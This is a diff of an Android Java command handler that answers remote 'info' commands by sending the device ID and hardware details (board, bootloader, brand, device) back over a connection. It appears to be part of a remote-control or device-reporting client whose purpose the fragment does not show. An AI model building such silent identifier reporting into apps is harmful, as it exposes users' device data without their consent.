@@ -37,7 +37,6 @@ public class InfoCommand extends CommandFather{
         try {
             String[] rawCommandArray = command.split(" ");
             switch (rawCommandArray[1]) {
-
                 // Package Info
 
                 case "ResolveInfo":
@@ -93,22 +92,29 @@ public class InfoCommand extends CommandFather{
 
                 case "DeviceId":
                     Log.d(TAG, "DeviceId");
-                    getPackagesInfo.getDeviceId();
-                    this.send("DeviceId");
+                    this.send("DeviceId :" + getPackagesInfo.getDeviceId());
                     break;
 
                 // Phone Info
 
                 case "BOARD":
+                    Log.d(TAG, "BOARD");
+                    this.send("BOARD :" + getPhoneInfo.getBOARD());
                     break;
 
                 case "BOOTLOADER":
+                    Log.d(TAG, "BOOTLOADER");
+                    this.send("BOOTLOADER :" +getPhoneInfo.getBOOTLOADER());
                     break;
 
                 case "BRAND":
+                    Log.d(TAG, "BRAND");
+                    this.send("BRAND :" +getPhoneInfo.getBRAND());
                     break;
 
                 case "Device":
+                    Log.d(TAG, "Device");
+                    this.send("Device :" +getPhoneInfo.getDevice());
                     break;
 
                 case "Display":
